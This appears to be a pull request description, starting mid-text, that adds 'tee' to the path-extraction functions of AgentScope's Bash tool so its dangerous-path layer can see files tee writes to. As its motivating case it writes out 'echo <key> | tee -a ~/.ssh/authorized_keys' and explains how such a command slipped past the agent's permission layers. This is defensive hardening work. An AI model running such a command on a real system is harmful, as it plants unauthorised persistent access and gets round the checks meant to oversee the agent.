`--no-config` has existed in ripgrep since 0.10, so this needs no minimum-version bump. A user who deliberately wants ripgrep defaults applied to the agent's searches cannot get them through this tool any more; that is the point of the change, and the in-process `Glob`/`Read` tools do not read that config either.

## PR Title Format

`fix(tool): extract tee targets so dangerous-path checks can see them`

## AgentScope Version

`2.0.11dev`

## Description

**Background.** #3313 reported that the Bash tool treated `tee` as read-only. That part is already fixed on `main` — `SAFE_COMMANDS` no longer contains it, so Layer 1 no longer short-circuits the permission check. The report's second finding was still open:

> `extract_file_paths()` … does not cover `tee`, so Layer 4 dangerous-path detection would not see tee's target files even if Layer 1 were fixed.

**Why that matters.** `tee` writes only to its operands. In `echo <key> | tee -a ~/.ssh/authorized_keys` nothing else in the command names a file, and `|` is not a redirection, so before this change `extract_file_paths()` returned `[]` and `_extract_dangerous_paths_from_bash()` had nothing to test against `_is_dangerous_path()`. The command is no longer auto-allowed, but the layer that is supposed to recognise the *target* as sensitive was blind to it.

**The change.** Add `tee` to the file-manipulating command list in both extraction paths:

- `_extract_paths_from_node()` — the tree-sitter path, which walks `command` nodes and collects non-flag arguments;
- `_extract_paths_fallback()` — the token-based path used when parsing fails, so the two agree.

Docstrings in `_bash_parser.py` and `_bash.py` list the covered commands, so they now mention `tee`.

Scope is deliberately limited to path extraction: `tee` is not re-added to `SAFE_COMMANDS`, and no other command classification changes.

**How to test.**

```console

3 passed, 9 subtests passed
```
